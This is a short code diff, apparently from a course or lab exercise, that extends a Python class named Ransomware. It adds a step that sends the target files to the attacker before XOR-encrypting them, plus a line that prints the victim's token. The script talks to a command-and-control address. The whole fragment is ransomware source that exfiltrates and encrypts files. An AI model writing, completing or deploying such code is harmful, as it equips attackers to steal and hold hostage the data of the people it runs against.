@@ -88,6 +88,8 @@ class Ransomware:
         secret_manager.setup()
 
 
+        # Envoyer les fichiers à l'attaquant
+        secret_manager.leak_files(files_to_encrypt)
         # Chiffrer les fichiers
         secret_manager.xorfiles(files_to_encrypt)
 
@@ -100,6 +102,10 @@ class Ransomware:
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         secret_manager.load()
         encrypted_files = self.get_files("*.txt")
+
+        # print token to the user
+        hex_token = secret_manager.get_hex_token()
+        print(f"Remember, your token is: {hex_token}")
 
         while True:
             try:
@@ -130,7 +136,6 @@ class Ransomware:
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
-    print(sys.argv)
     if len(sys.argv) < 2:
         ransomware = Ransomware()
         ransomware.encrypt()
